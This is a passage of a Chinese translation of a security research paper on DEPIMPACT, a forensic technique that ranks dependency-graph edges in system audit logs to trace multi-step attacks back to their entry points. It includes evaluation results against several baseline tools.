49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="msub" transform="translate(9388.4,0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g></g><g data-mml-node="mo" transform="translate(10476.6,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msub" transform="translate(11198.8,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z"></path></g><g data-mml-node="TeXAtom" transform="translate(977,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(466,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(855,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1427,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1705,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(2190,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(14049.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(14438.4,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(14938.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 其中 DI<sub>u</sub> 表示节点 u 的依赖影响，W<sub>e(u,v)</sub>表示边 e(u,v)的依赖权重（归一化后）。这种分数传播方案保证了任意节点的分数不超过其子节点的最大分数，并且任意节点的分数不超过POI事件中节点的分数。此外，与PageRank等基于分布的分数传播算法相比，我们的方案保留了沿长依赖路径的分数并防止快速退化。</p><p><img src="image-20221115203602254.png"></p><p>算法1说明了我们的依赖影响分数传播算法。在每次迭代中，该算法通过取其所有子节点的得分的加权和来更新每个节点的依赖影响得分(第10行)，并计算所有节点的分数差的和(第11行)。当当前迭代与先前迭代之间的聚合差小于阈值δ(第2行)时，传播终止，表明所有节点的分数都已达到稳定点。我们设置 δ =1e-13，因为它从我们的评估中给出了鲁棒的结果。</p><h4 id="入口节点排名">4.3.2 入口节点排名</h4><p>在依赖影响传播后，DEPIMPACT根据入口节点的依赖影响对其进行排名。入口节点排名的原理是：具有更高依赖影响的入口节点与POI事件更相关，并且更有可能是攻击条目，因此它们的后代节点和相关边更有可能包含在关键组成部分中。具体来说，我们将入口节点分为三类:(1) 文件入口节点: 文件节点除系统库外没有传入边; (2) 进程入口节点:进程节点的父节点都是系统库; (3) 网络入口节点:网络节点没有传入边。特别地，系统库文件通常由某些进程加载，并且在依赖关系图上没有传入边。因此，对于系统库节点，我们将加载进程节点作为入口节点。然后，我们从每个类别中选择排名靠前的条目节点。</p><h4 id="关键组成部分识别">4.3.3 关键组成部分识别</h4><p>从排名靠前的入口节点开始，DEPIMPACT执行正向因果关系分析，直到到达POI事件。作为最后一步，DEPIMPACT将后向依赖图和前向依赖图的重叠识别为输出的关键组成部分。与原始的大型后向依赖图相比，关键组成部分包含与POI事件实际相关的依赖部分，并且其大小显著减小。此外，关键组成部分说明了与攻击相关的信息如何通过关键边从攻击条目流向POI 事件，这有助于进一步的攻击调查。</p><h2 id="评估">5 评估</h2><p>我们在Sysdig上构建了DEPIMPACT(Java中大概2万行代码)，并使用基于已知漏洞构建的攻击案例和DARPA透明计算(TC) 程序收集的攻击案例来评估DEPIMPACT。在评估中，我们旨在回答以下研究问题: -<strong>RQ1:</strong>与其他最新技术相比，DEPIMPACT在揭示攻击序列方面的有效性如何？ -<strong>RQ2:</strong>在DEPIMPACT中应该使用多少个排名靠前的入口节点来揭示攻击序列？- <strong>RQ3:</strong> DEPIMPACT在揭示攻击条目方面有多有效？ -<strong>RQ4:</strong> DEPIMPACT调查攻击的效率如何？</p><h3 id="评估设置">5.1 评估设置</h3><p>我们在 5 台 Linux 主机上部署了Sysdig来收集系统审计事件，然后应用DEPIMPACT 进行攻击调查。 DEPIMPACT 在具有 Intel(R) Xeon(R) CPU E5-2637v4 (3.50GHz)、256GB RAM 运行 64 位 Ubuntu 18.04.1的服务器上执行。为了调查基于已知漏洞的攻击案例，我们在部署的环境中进行了10 次攻击：7 次基于常用漏洞的攻击和 3 次基于 Cyber Kill Chain框架和CVE的多主机和多步入侵攻击报道。部署的主机有 12个活跃用户和数百个进程，用于文件操作、文本编辑和软件开发等各种类型的日常任务，这些都是真实世界使用情况的代表。在评估期间，部署的主机继续恢复其日常任务，以模拟不相关的系统活动和攻击活动共存的真实情景。这些机器上的例行任务确保收集到足够多的无关系统活动的噪音。总的来说，在我们部署的主机中收集的真实系统审计日志包含约1 亿个事件。DARPA 数据集包括从 5个不同操作系统的主机收集的系统审计日志。我们开发了一个工具来解析发布的日志并将事件加载到我们的数据库中。总的来说，我们评估中使用的DARPA 数据集包含约 5000 万个事件。接下来我们将详细描述这些攻击。</p><h4 id="基于常用漏洞的攻击">5.1.1 基于常用漏洞的攻击</h4><p>这 7 种攻击用于先前工作的评估，包括以下场景：</p><ul><li>Wget 可执行文件：易受攻击的服务器允许攻击者使用wget。攻击者下载python 脚本并执行。</li><li>非法存储：服务器管理员使用 wget 将可疑文件下载到用户的主目录。</li><li>非法存储 2：服务器管理员使用 curl将可疑文件下载到用户的主目录。</li><li>隐藏文件：攻击者的目标是将恶意文件隐藏在用户的正常文件中。攻击者下载恶意脚本并通过更改其文件名和位置来隐藏它。</li><li>窃取信息：攻击者窃取用户的敏感信息并将信息写入隐藏文件。</li><li>后门下载：恶意内部人员使用ping命令与恶意服务器测试连接，然后从服务器下载后门脚本并通过重命名来隐藏脚本。</li><li>捣乱的服务器用户：捣乱用户登录到易受攻击的服务器上其他用户的主目录，并将一些垃圾数据写入其他用户的文件。</li></ul><h4 id="多主机入侵攻击">5.1.2 多主机入侵攻击</h4><p>这3种多主机入侵攻击捕获了Cyber KillChain框架和CVE中描述的攻击的重要特征。在这3种攻击中，攻击者使用一个外部主机，称为C2（命令和控制）服务器来执行渗透、分发恶意软件和接收数据。第一个受到攻击的主机称为主机1，它是执行横向移动的起点，其他恶意行为也会危害到网络中更多的主机（即主机2....主机 n）</p><p><strong>攻击1：Shellshock渗透</strong>在主机1的初始Shellshock渗透后，攻击者连接到云服务（例如，Dropbox，Twitter），并下载一个图像，其中C2服务器的IP地址被编码在EXIF元数据中。这种行为是APT攻击逃避基于DNS黑名单的网络检测系统的常见做法。攻击者基于IP，将恶意软件从C2服务器下载到主机1。当执行该脚本时，它会扫描ssh配置文件，以找到网络中可访问的主机，从而发现主机2、主机3和主机4。在此发现阶段之后，恶意软件从C2服务器下载另一个脚本，并将其发送到这些已发现的主机，并窃取它们的密码。</p><p><strong>攻击2：Shellshock渗透后的数据泄露</strong>在上一次侦察之后，攻击者从C2服务器下载另一个恶意软件<strong>leak_data.sh</strong>，并将其发送到主机2。恶意软件扫描隐藏的文件和包含敏感字符串的文件，并将它们压缩成<strong>leak.tar.bz2</strong>压缩文件中。然后恶意软件将压缩文件转移回主机1。在主机1上，压缩文件被加密并上传到互联网上。</p><p><strong>攻击3：VPN Filter</strong>在这个阶段，攻击者试图从C2服务器维护与受害者主机的直接连接。他利用了臭名昭著的VPNFilter恶意软件，该软件通过利用一些已知的或0-day漏洞，感染了数百万台物联网设备。在首次渗透主机1并发现主机2后，攻击者将VPNFilter第一部分的恶意软件从C2服务器下载到主机1，并将其传输到主机2。然后，这个恶意软件从C2服务器下载另一个可执行文件，并执行它来启动攻击，并建立与C2服务器的连接。使用此连接，攻击者将恶意脚本传输到主机2，该脚本将在主机2上收集敏感数据。</p><h4 id="darpa-tc攻击案例">5.1.3 DARPA TC攻击案例</h4><p>由DARPATC程序发布的数据集包含在不同的操作系统上执行的攻击案例。基于数据集中提供的攻击描述，我们排除了不能复现的攻击案例，以及在安卓系统上的攻击案例，因为移动应用程序的行为受到安卓沙箱的限制，不适合我们的分析。我们还排除了网络钓鱼电子邮件攻击，因为它们的大部分操作都是通过点击浏览器中的链接，并在系统审计日志中留下有限的痕迹。我们总共选择了五种针对不同操作系统（Linux、Windows）的攻击，并利用不同的漏洞（火狐后门和浏览器扩展）。这些攻击案例跨越数天（例如，Theia数据包含8天的日志）。</p><h4 id="获得攻击的真实情况">5.1.4 获得攻击的真实情况</h4><p>对于在我们的主机上执行的攻击案例，我们根据执行的攻击识别 POI事件，并从 POI 事件应用反向因果分析以获得系统依赖图。对于 DARPA数据集中的攻击案例，我们查询加载日志的数据库，根据攻击描述识别 POI事件，并从 POI事件中应用反向因果关系分析，得到系统依赖图。对于涉及多台主机的攻击，DEPIMPACT基于现有技术进行跨主机因果关系分析，生成包含特殊网络连接边的因果关系图来表示多台主机之间的连接。最后，在我们的最大努力下，我们根据对执行的攻击的了解和这些系统依赖关系图中的攻击描述，手动确保识别关键边缘和攻击条目。</p><p><img src="image-20221115220817935.png"></p><p>表4显示了针对攻击生成的依赖关系图的统计信息。<em>Causality Ana. #V</em>列和<em>Causality Ana. #E</em>列显示了从POI事件执行因果关系分析后的节点和边的数量。<em>Edge Mer.# V</em>l列和<em>Edge Mer. # E</em>列显示应用边合并(第4.2.1节)后的节点和边的数量。<em>Entry Nodes</em>列和<em>CriticalEdge</em>列显示依赖关系图的入口节点和关键边的数量。<em>AttackEntries</em>列显示标记为攻击条目的条目节点的数量。列<em>POI</em>显示了POI事件中文件的数据大小。我们清楚地观察到，即使在边合并之后，在依赖图中仍然存在大量的边(平均631K，最大为330万条边)，这促进了DEPIMPACT进一步修剪。此外，在这15次攻击中，POI事件中的文件具有不同的大小，从124字节到50M字节，并且平均而言，有42,757边缘(最大962,706条)具有与POI事件中的文件相似的数据大小。因此，直接使用数据流量来揭示攻击序列将在结果中包含许多不相关的边，这促使DEPIMPACT结合多个特征来计算边权重，以实现更好的性能。</p><p><strong>评估指标</strong>除了测量误报（检测到的非关键边的边）和漏报（缺失的边是关键边）之外，我们还计算了误报率FNR = FN/E<sub>c</sub>，其中 FN表示误报的数量，E<sub>c</sub>表示关键边的数量（表 4 中的<em>CriticalEdge</em>列）。误报率 FPR = FP/E<sub>total</sub>，其中 FP表示误报数，E<sub>total</sub>表示来自表 4 中<em>Edge Merge #E</em>列的边数。</p><h3 id="rq1-揭示攻击序列">5.2 RQ1: 揭示攻击序列</h3><p>为了证明DEPIMPACT通过修剪非关键边揭示攻击序列中的有效性，我们将DEPIMPACT与4种最先进的技术进行了比较:CPR，ReadOnly，PrioTracker和NoDoze。对于每次攻击，DEPIMPACT都会根据其依赖性影响对入口节点进行排名，并根据排名逐个选择节点以执行前向因果关系分析;如果新选择的节点导致关键组成部分包含明显更多的边(即，依赖关系图的总边的1%)。如果两个节点之间的时间差在阈值 (即10秒)内，则CPR合并两个节点之间的边。ReadOnly移除其源节点为只读文件的边。PrioTracker主要使用节点的扇出来对因果关系分析中的依赖关系进行优先级排序。然后，我们将计算出的先验值调整为边的依赖权重，并过滤低权重的边。NoDoze根据相应系统事件的频率为每个边分配一个异常分数，然后计算每个路径的异常分数。由于NoDoze需要执行配置文件，因此我们使用已部署系统的日常日志文件作为已部署主机中攻击的执行配置文件，并使用日志中的正常事件(观察时间在攻击周期内的事件除外) 来处理DARPATC数据集中的攻击。根据每次攻击的真实情况，我们根据NoDoze的要求手动为恶意文件和ip地址分配较低的信誉分数。一旦NoDoze完成了整个图的异常分数的计算，我们将根据依赖图中每个路径的异常分数来执行图减少。</p><p><img src="image-20221115222546948.png"></p><p>表5显示了DEPIMPACT和其他技术的依赖关系图缩减。结果表明，DEPIMPACT在依赖关系图缩减方面性能最好。平均而言，由DEPIMPACT生成的依赖关系图的大小(即，由DEPIMPACT输出的关键组成部分) 至少比次优结果 (即，NoDoze)小72倍，并且比其他3种技术小3或4个数量级。此外，DEPIMPACT不会像其他技术那样失去任何关键边。我们接下来解释每个技术的比较。</p><p>CPR仅合并一对节点之间的边，因此缺乏修剪来自不相关系统活动的不相关边的能力。删除只读文件是基于启发式的，并且不能鲁棒地针对不同攻击的表现良好性能，如结果所示（例如，"Wget可执行文件"攻击为 58，而"隐藏文件"攻击为 600,000+）。与 PrioTracker的比较显示了我们的判别特征投影方案优于 PrioTracker中的扇出特征。从结果中，我们可以观察到 NoDoze通常表现良好但对于某些攻击表现不佳（例如，有5次攻击生成具有大于10,000条边的图）主要原因是这些依赖图中有许多罕见的良性事件没有出现在执行配置文件。换句话说，NoDoze的有效性在很大程度上取决于执行配置文件是否可以捕获所有良性事件，这通常很难，因为大多数组织的运行时环境是动态的和通用的。另一方面，与NoDoze 相比，DEPIMPACT在没有共享其两个主要限制的情况下取得了更好的缩减效果：（1）DEPIMPACT不依赖第三方服务为恶意文件或 IP 地址分配信誉； (2) DEPIMPACT不需要部署系统的执行配置文件进行训练。这些特性大大降低了在新系统中部署DEPIMPACT 的难度，使 DEPIMPACT 能够实现比 NoDoze 更好的泛化。</p><p><img src="image-20221115223706166.png"></p><p><strong>背景行为的影响</strong> 为了更好地评估 DEPIMPACT在大量背景良性行为与某些应用程序的攻击行为混合时的性能，我们启动了具有不同打开选项卡数量的Firefox 浏览器，并对 Firefox浏览器进行了"后门下载"攻击。打开的标签执行不同类型的良性行为，例如加载/更新页面和运行JavaScript，模拟常见的良性行为。然后我们应用 DEPIMPACT来调查这些攻击，结果如表 6 所示。我们可以看到，当打开的选项卡从 0 增加到10 时，误报率略有增加（从 0.15 到 0.21），而漏报率保持0.0。这样的结果表明 DEPIMPACT 的性能不受复杂软件工作负载的显着影响。</p><p><img src="image-20221115223841677.png"></p><p><img src="image-20221115223853309.png"></p><p><strong>案例分析</strong> 图 3 和图 4显示了两次攻击的关键组成部分。我们用实线表示关键边，虚线表示非关键边。POI 事件清楚标有文字说明。 图 3 显示了 DEPIMPACT 为 DARPA TC数据集中的"Theia Case 1"攻击生成的关键组成部分。我们可以观察到Firefox浏览器开始从恶意 IP地址下载文件<strong>/home/admin/clean</strong>。在这里，IP地址（即后门的来源）被正确识别为攻击条目，并且所有关键边缘都被保留。</p><p>图 4 显示了 DEPIMPACT 为"Shellshock"攻击生成的 3 个关键组成部分。 POII的关键组成部分（步骤①）显示Host1首先从C2服务器下载恶意脚本，然后通过scp进程向Host2发送恶意脚本<strong>/tmp/crack_password.sh</strong>。然后，该恶意软件在主机2 中收集用户敏感数据，并通过进程 scp 将这些数据发送回主机 1（步骤②）。此步骤后，敏感数据在主机 1 中被压缩并发送回 C2服务器（③）。对于这张图，2台主机中3个关键组成部分的联合覆盖了所有关键边。特别地，步骤① 和 ②中的两个特殊的网络连接边启用了用于揭示攻击序列的跨主机依赖跟踪。</p><h3 id="rq2入口节点的选择">5.3 RQ2:入口节点的选择</h3><p>直观上，DEPIMPACT 用于执行正向因果关系分析的入口节点越多，DEPIMPACT错误过滤关键边的可能性就越小。但是使用更多的入口节点可能会在输出图中产生更多的误报。为了证明选择排名靠前的入口节点在揭示攻击序列方面的有效性，我们展示了所选入口节点的增加如何影响DEPIMPACT 在 FPR 和 FNR 方面的有效性。 DEPIMPACT在三个系统实体类别中的每一个类别中选择排名靠前的入口节点，并按照依赖影响递减的顺序从节点开始执行前向因果关系分析。</p><p><img src="image-20221115225137897.png"></p><p><strong>对 FPR 和 FNR 的影响</strong> 图 5 和图 6显示了排名前列的入口节点对 FPR 和 FNR的影响。正如预期的那样，当使用更多入口节点时，FNR 会降低，而 FPR会增加。我们可以注意到，当 FNR 变为零时（在不同的攻击中使用 2−6个节点），如果 DEPIMPACT继续利用更多的入口节点进行前向分析，FPR将大幅增加。基于此观察结果，我们建议DEPIMPACT停止选择更多的入口节点，当包括更多的入口节点进行正向分析时，将导致关键组成部分的显著增加。</p><h3 id="rq3揭示攻击条目">5.4 RQ3:揭示攻击条目</h3><p>在此 RQ 中，我们旨在衡量 DEPIMPACT在揭示攻击条目方面的有效性（即，攻击条目是否位于排名靠前的入口节点中）。具体来说，我们将DEPIMPACT 与 4 种baseline方法进行了比较：均匀随机方法、DEPIMPACT 的 2个简化版本：DEPIMPACT-、DEPIMPACT--和平均投影方法。均匀随机方法对所有入口节点进行随机排序。DEPIMPACT-使用时间相关性和数据流相关性来计算依赖权重，但不计算集中率。DEPIMPACT--仅使用时间相关性来计算依赖性权重。平均投影方法使用固定参数向量(0.334,0.333,0.333) 来计算依赖权重。</p><p><img src="image-20221116130049154.png"></p><p>表 8 显示了 DEPIMPACT和baseline方法计算的所有攻击条目的平均排名。我们观察到 DEPIMPACT始终将攻击条目排在前列（平均排名2.41）并取得最佳性能。与DEPIMPACT--，DEPIMPACT-，平均投影方法 (在"Avg.Proj." 列中显示) 和平均随机方法 (在 "Rand."列中显示)相比，DEPIMPACT在对攻击条目进行排名方面实现了79.14%，70.06%，69.62%和99.98%的改进。这些结果证明了DEPIMPACT包含所有三个特征的必要性，并且与平均投影方法的比较证明了我们的区分性特征投影方案优于固定参数向量。</p><h3 id="rq4系统性能">5.5 RQ4:系统性能</h3><p><img src="image-20221116130459562.png"></p><p>为了了解DEPIMPACT的性能，我们测量DEPIMPACT中每个步骤的执行时间，如表7所示。平均而言，DEPIMPACT花费343.84s完成攻击分析(即，权重计算和影响传播)，而依赖关系图的构建需要65.83s(即，因果关系分析和合并边)。接下来，我们将DEPIMPACT与平均投影方法和NoDoze进行比较。我们排除了常见步骤(因果关系分析和边合并边) 的执行时间比较。</p><p>从表 7 中的DEPIMPACT和平均投影方法的比较结果中，我们观察到 (1)因为DEPIMPACT使用 Multi-KMeans++ 聚类和 LDA来寻找最优投影向量，所以需要更多的时间（大约120s）来进行依赖权重计算；(2) DEPIMPACT 花费更少的时间进行依赖影响传播。原因是因为 DEPIMPACT计算的依赖权重更具辨别力，因此分数传播可以更快地收敛。因此，与平均投影方法相比，DEPIMPACT将执行时间减少了 71.94%。</p><p>从表 7 中 DEPIMPACT 和 Nodoze 的对比结果可以看出，DEPIMPACT 需要343.84s 完成权重计算和影响传播，NoDoze 需要 144.15s完成s的异常分数计算。特别是，虽然 DEPIMPACT需要更多时间来处理其依赖图具有超过 300 万条边的 2种攻击（即"隐藏文件"和"窃取信息"），但 DEPIMPACT 产生的图要小得多（约800条边）比 NoDoze（超过20,000 个边）。平均而言，DEPIMPACT 需要 343.84秒来完成依赖权重计算和依赖影响传播，而 NoDoze 需要 144.15秒来完成异常分数计算（整个分析409.67 秒 vs 209.98 秒）。因此，DEPIMPACT和 NoDoze 对于大多数攻击具有相似的运行性能，而 NoDoze对于某些特定攻击更有效，但实现的图缩减更差。</p><h2 id="讨论">6 讨论</h2><p><strong>逃避攻击</strong> 现有的因果关系分析技术，例如NoDoze，利用执行配置文件和实体的信誉（例如 IP和文件信誉）来识别异常边。如 5.2节所示，攻击者可能会在良性事件中隐藏他们的攻击步骤，或者试图滥用信誉系统来隐藏他们的攻击步骤。与现有技术不同，DEPIMPACT不会遭受此类攻击，因为 DEPIMPACT不依赖于系统实体的执行配置文件和信誉。为了滥用我们的权重计算和反向传播技术，攻击者可能会执行多次写入以将完整的攻击载荷注入文件，其中大部分写入行为都像正常行为。为了减轻此类攻击，我们可以将每个写入事件视为一个POI事件，对包含攻击载荷的恶意文件的所有写入事件应用DEPIMPACT，并调查所有生成图。我们还可以采用基于进程的异常检测技术来帮助区分这些恶意的写入。</p><p><strong>真实世界攻击的取证</strong> 高级持续威胁 (APT)和其他现实世界的攻击是复杂的（利用各种漏洞的多步攻击）和隐秘的（长时间处于休眠状态）。由于日志压缩技术的进步和存储成本的持续降低，存储系统审计日志数月甚至数年变得可以承受。此外，最近的分布式数据库解决方案显示了提高日志分析性能的有希望的结果。通过与这些解决方案一起运行，DEPIMPACT可以有效地应用于长期日志数据以调查潜在的攻击。 DEPIMPACT可以与威胁检测技术无缝集成，为报告的警报（即 POI事件）自动生成关键组成部分，安全分析师可以检查小图（即关键组成部分）以获取用于处理警报的上下文信息。</p><p><strong>设计备选方案</strong>DEPIMPACT是一个通用框架，可以使用不同的特征组合来调查不同类型的攻击。我们对各种攻击场景（第5.1节）的评估证明了所选功能的有效性和鲁棒性。除了提出的特征外，DEPIMPACT还支持根据特定的取证调查需求轻松合并其他特征。对于边的权重计算，一种替代方法是使用这些特征训练二元分类器并输出概率分数作为边缘权重。然而，这种基于监督学习的方法在我们的问题上下文中面临着很大的局限性：（1）由于我们的一些特征是针对特定的POI计算的，因此针对一种攻击类型学习的分类模型很难推广到具有不同类型攻击不同的POI；(2)这种方法通常需要大量的训练数据，而关键边是有限的，我们的问题上下文是高度不平衡的。在基于无监督学习的方法中，基于异常检测的方法可以替代KMeans 聚类方法，并且 LDA 可以有替代方案来实现不一样的降维。</p><p><strong>运行时性能改进</strong> DEPIMPACT的性能可能受益于数据库优化和并行化。可以通过采用数据库优化和并行化技术来加快搜索速度改善因果分析。不同边的特征提取是独立的，也可以并行化。反向传播（等式(7)）可以转化为矩阵向量乘积形式，以节省CPU周期。通过利用类似于并行PageRank的想法，进一步的并行化是可能的。</p><p><strong>限制</strong>为了调查攻击，DEPIMPACT依赖于底层检测系统来识别与攻击相关的POI事件。如果底层检测系统未能做到这一点，DEPIMPACT将无法进行攻击调查。最近的方法提出了改善异常系统活动检测的解决方案，DEPIMPACT可以与这些方法一起提供更好的防御。此外，由于由产生关键边的进程执行了不相关的系统活动，DEPIMPACT产生的关键组成部分平均仍具有超过200的条边(即，表5)。我们计划探索如何结合专家知识和网络威胁情报(CTI)来过滤掉这些非关键边。最后，DEPIMPACT不能用于实时分析，因为在某些情况下，即使应用了高级数据压缩和并行计算，依赖关系图的生成耗费也很大。我们计划探索可以提供像渐进更新一样更快反馈的选项。</p><h2 id="相关工作">7 相关工作</h2><p><strong>通过系统审计日志进行取证分析</strong>基于系统审计数据的因果关系分析对于取证分析起着至关重要的作用。King等人通过自动重构一系列依赖于用户指定的POI事件的事件，提出了一种向后因果关系分析技术。Goel等人提出了一种基于取证分析的入侵还原的技术。最近已经通过执行细粒度的因果关系分析，依赖关系优先级，自定义内核和优化存储来缓解依赖关系爆炸问题。然而，这些技术受到采用限制，因为它们主要依赖于导致信息丢失的启发式规则，侵入式系统更改(如二进制工具和内核自定义，或具有有限泛化的执行配置文件。DEPIMPACT提出了基于多个特征计算有区别的依赖权重，并从POI事件进行反向传播计算依赖影响识别攻击条目，这些攻击条目与现有技术没有相同的采用限制。我们的评估结果进一步证明了DEPIMPACT的有效性在现有技术之上。</p><p>行为查询利用领域特定语言（DSLs）来搜索系统调用事件的模式。Gao等人提出了领域特定语言，通过查询系统调用事件的历史和实时流，可以实现有效的攻击调查和攻击检测。这些DSLs的一个主要限制是它们需要手工操作来构建查询，这是劳动密集型并容易出错的。Gao等人进一步提出了一种自动化的通过使用NLP从网络威胁情报(CTI) 